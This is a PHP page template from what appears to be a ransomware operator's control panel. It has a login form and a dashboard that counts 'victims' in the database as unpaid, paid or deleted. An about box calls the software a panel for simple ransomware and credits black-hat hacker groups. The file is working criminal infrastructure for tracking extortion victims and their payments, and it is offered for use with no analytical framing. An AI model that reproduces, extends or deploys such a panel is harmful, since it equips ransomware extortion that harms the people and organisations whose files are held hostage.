<?php include ROOT."content/theme/header.php"; ?>
	<?php if(!isset($_SESSION['LOGIN'])){ ?>
		<div class="wrapper">
			<div class="container">
				<div class="row">
					<div class="module module-login span4 offset4">
						<form class="form-vertical" method="post" action="?page=login">
							<div class="module-head">
								<h3>Sign In</h3>
							</div>
							<div class="module-body">
								<?=$GLOBALS['notice']->showSuccess();?>
								<?=$GLOBALS['notice']->showError();?>
								<div class="control-group">
									<div class="controls row-fluid">
										<input name="username" class="span12" type="text" autocomplete="off" id="inputEmail" placeholder="Username">
									</div>
								</div>
								<div class="control-group">
									<div class="controls row-fluid">
										<input name="password" class="span12" type="password" autocomplete="off" id="inputPassword" placeholder="Password">
									</div>
								</div>
							</div>
							<div class="module-foot">
								<div class="control-group">
									<div class="controls clearfix">
										<button type="submit" class="btn btn-primary pull-right" name="login">Login</button>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div><!--/.wrapper-->
	<?php } else { ?>
		<div class="wrapper">
            <div class="container">
                <div class="row">
                    <div class="span3">
					<?php include ROOT."content/page/sidebar.php";?>
					</div>
					<div class="span9">
                        <div class="content">
							<div class="row-fluid">
                                <div class="span12">
									<?=$GLOBALS['notice']->showSuccess();?>
                                    <?=$GLOBALS['notice']->showError();?>
                                </div>
                            </div>
                            <div class="btn-controls">
                                <div class="btn-box-row row-fluid">
                                    <a href="#" class="btn-box big span3"><i class=" icon-group"></i><b><?php $db->go("SELECT * FROM victims");echo $db->numRows();?></b>
                                        <p class="text-muted">Victims</p>
                                    </a>
									<a href="#" class="btn-box big span3"><i class="icon-barcode"></i><b><?php $db->go("SELECT * FROM victims WHERE status = 0");echo $db->numRows();?></b>
                                        <p class="text-muted">Unpaid</p>
                                    </a>
                                    <a href="#" class="btn-box big span3"><i class=" icon-credit-card"></i><b><?php $db->go("SELECT * FROM victims WHERE status = 1");echo $db->numRows();?></b>
                                        <p class="text-muted">Payed</p>
                                    </a>
									<a href="#" class="btn-box big span3"><i class="icon-trash"></i><b><?php $db->go("SELECT * FROM victims WHERE status = 2");echo $db->numRows();?></b>
                                        <p class="text-muted">Deleted</p>
                                    </a>
                                </div>
                                <div class="btn-box-row row-fluid">
									<div class="module">
									<!-- NGEDIT TAK GEBUK !!! | NGEDIT MAHO !!!-->
										<div class="module-head">
											<h3>Website & System About</h3>
										</div>
										<div class="module-body">
											<blockquote> 
												<p><?php echo $IB_TITLE;?> is a panel for simple Ransomware. This is just a beta version maybe have many bug.</p>
												<p>This panel created on April 2016 and developed by MrCry.</p>
												<span><b>Thanks to :<b> 
														<ul>
															<li> Yogyakarta BlackHat</li>
															<li> Darkploit Society</li>
															<li> My Best Friend</li>
															<li> And all of World Black Hat Hackers</li>
														</ul>
												</span>
												<p>If you found bug or error in this site, please contact me at <a href="mailto:mrcry@fbi.gov">mrcry@fbi.gov</a></p>
												<small>Copyleft &copy; <?php echo date("Y");?> <?php echo $IB_TITLE;?> Powered By MrCry.</small>
											</blockquote>
										</div>
									</div>
                                </div>
                            </div>
                            <!--/#btn-controls-->
                        </div>
                        <!--/.content-->
                    </div>
				</div>
			</div>
		</div>
	</div>
	<?php } ?>
<?php include ROOT."content/theme/footer.php"; ?>